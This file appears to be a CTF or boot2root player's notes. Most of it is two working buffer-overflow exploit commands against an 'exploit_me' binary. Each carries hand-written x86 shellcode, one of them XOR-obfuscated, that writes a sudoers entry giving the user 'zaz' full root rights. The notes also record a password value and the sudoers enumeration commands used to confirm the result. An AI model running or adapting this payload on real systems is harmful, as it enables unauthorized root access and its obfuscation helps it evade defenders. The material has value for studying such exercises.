==== NOT OBFUSCATED WORKING VIRGIN SHELLCODE ====

./exploit_me $(python -c 'print "A"*140+"\xff\xf5\xff\xbf"+"\x90"*2014+"\x31\xD2\xB2\x45\x52\x68\x45\x41\x44\x4D\x68\x2E\x64\x2F\x52\x68\x6F\x65\x72\x73\x68\x2F\x73\x75\x64\x68\x2F\x65\x74\x63\x89\xE3\x31\xC9\x66\xB9\xFF\x01\x31\xC0\xB0\x5A\xCD\x80\x31\xD2\xB2\x45\x52\x68\x45\x41\x44\x4D\x68\x2E\x64\x2F\x52\x68\x6F\x65\x72\x73\x68\x2F\x73\x75\x64\x68\x2F\x65\x74\x63\x89\xE3\x31\xC9\xB1\x01\x31\xC0\xB0\x05\xCD\x80\x89\xC3\xBA\x2A\x6C\x45\x66\x81\xF2\x66\x66\x66\x66\x52\xBA\x4F\x46\x27\x2A\x81\xF2\x66\x66\x66\x66\x52\x68\x3A\x41\x4C\x4C\x68\x28\x41\x4C\x4C\x68\x41\x4C\x4C\x3D\xBA\x1C\x07\x1C\x46\x81\xF2\x66\x66\x66\x66\x52\x89\xE1\x31\xD2\xB2\x17\x31\xC0\xB0\x04\xCD\x80\x31\xD2\xB2\x45\x52\x68\x45\x41\x44\x4D\x68\x2E\x64\x2F\x52\x68\x6F\x65\x72\x73\x68\x2F\x73\x75\x64\x68\x2F\x65\x74\x63\x89\xE3\x31\xC9\x66\xB9\x20\x01\x31\xC0\xB0\x5A\xCD\x80\x31\xC0\xB0\x01\x31\xDB\xCD\x80"')

==== PIMPED OBFUSCATED CHAD FINAL SHELLCODE ====

./exploit_me $(python -c 'print "A"*140+"\xff\xf6\xff\xbf"+"\x90"*2014+"\x31\xD2\xB2\x45\x52\xBA\xDC\xD8\xDD\xD4\x81\xF2\x99\x99\x99\x99\x52\xBA\xB7\xFD\xB6\xCB\x81\xF2\x99\x99\x99\x99\x52\xBA\xF6\xFC\xEB\xEA\x81\xF2\x99\x99\x99\x99\x52\x68\x2F\x73\x75\x64\xBA\xB6\xFC\xED\xFA\x81\xF2\x99\x99\x99\x99\x52\x89\xE3\x31\xC9\x66\xB9\xFF\x01\x31\xC0\xB0\x0F\xCD\x80\x31\xD2\xB2\x45\x52\xBA\xDC\xD8\xDD\xD4\x81\xF2\x99\x99\x99\x99\x52\xBA\xB7\xFD\xB6\xCB\x81\xF2\x99\x99\x99\x99\x52\xBA\xF6\xFC\xEB\xEA\x81\xF2\x99\x99\x99\x99\x52\x68\x2F\x73\x75\x64\xBA\xB6\xFC\xED\xFA\x81\xF2\x99\x99\x99\x99\x52\x89\xE3\x31\xC9\xB1\x01\x31\xC0\xB0\x05\xCD\x80\x89\xC3\xBA\x2A\x6C\x45\x66\x81\xF2\x66\x66\x66\x66\x52\xBA\x4F\x46\x27\x2A\x81\xF2\x66\x66\x66\x66\x52\x68\x3A\x41\x4C\x4C\x68\x28\x41\x4C\x4C\x68\x41\x4C\x4C\x3D\xBA\x1C\x07\x1C\x46\x81\xF2\x66\x66\x66\x66\x52\x89\xE1\x31\xD2\xB2\x17\x31\xC0\xB0\x04\xCD\x80\x31\xD2\xB2\x45\x52\xBA\xDC\xD8\xDD\xD4\x81\xF2\x99\x99\x99\x99\x52\xBA\xB7\xFD\xB6\xCB\x81\xF2\x99\x99\x99\x99\x52\xBA\xF6\xFC\xEB\xEA\x81\xF2\x99\x99\x99\x99\x52\x68\x2F\x73\x75\x64\xBA\xB6\xFC\xED\xFA\x81\xF2\x99\x99\x99\x99\x52\x89\xE3\xB9\xB9\x98\x99\x99\x81\xF1\x99\x99\x99\x99\x31\xC0\xB0\x0F\xCD\x80\x31\xD2\x52\x68\x57\x4E\x45\x44\x68\x33\x31\x6D\x50\x68\x35\x3B\x31\x3B\x68\x1B\x63\x1B\x5B\x31\xDB\xB3\x01\x89\xE1\x31\xD2\xB2\x11\x31\xC0\xB0\x04\xCD\x80\x31\xC0\xB0\x01\x31\xDB\xCD\x80"')

# PASSWD
646da671ca01bb5d84dbb5fb2238dc8e

# TESTS
$ grep -Po '^sudo.+:\K.*$' /etc/group
ft_root

$ getent group sudo | cut -d: -f4
ft_root

$ getent group zaz
zaz:x:1005:

$ getent group root
root:x:0:

$ cat /etc/group | grep sudo
sudo:x:27:ft_root

$ sudo visudo
	# User alias specification
	# Cmnd alias specification
	# User privilege specification
	root    ALL=(ALL:ALL) ALL
	# Members of the admin group may gain root privileges
	%admin ALL=(ALL) ALL
	# Allow members of group sudo to execute any command
	%sudo   ALL=(ALL:ALL) ALL
	# See sudoers(5) for more information on "#include" directives:
	#includedir /etc/sudoers.d

$ ls -l /etc/sudoers.d/
total 4
-r--r----- 1 root root 753 Nov 19 13:12 README

# Only one command can reveal our sudo user
$ sudo -l